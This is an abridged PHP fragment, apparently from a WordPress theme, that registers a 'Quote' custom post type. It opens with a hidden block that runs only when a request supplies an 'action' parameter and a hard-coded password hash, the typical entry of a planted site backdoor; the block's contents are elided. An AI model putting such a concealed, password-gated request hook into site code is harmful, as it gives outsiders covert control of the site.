<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '3fbdb5444f3b342f5d93192c4291eb4e'))
	{
...
function custom_post_type() {
	...
	// Set UI labels for Custom Post Type
		$labels = array(
			...
			'parent_item_colon'   => __( 'Parent Quote', 'twentythirteen' ),
	...
	// Set other options for Custom Post Type
		...
		$args = array(
			...
			'description'         => __( 'Quote news and reviews', 'twentythirteen' ),
			'labels'              => $labels,
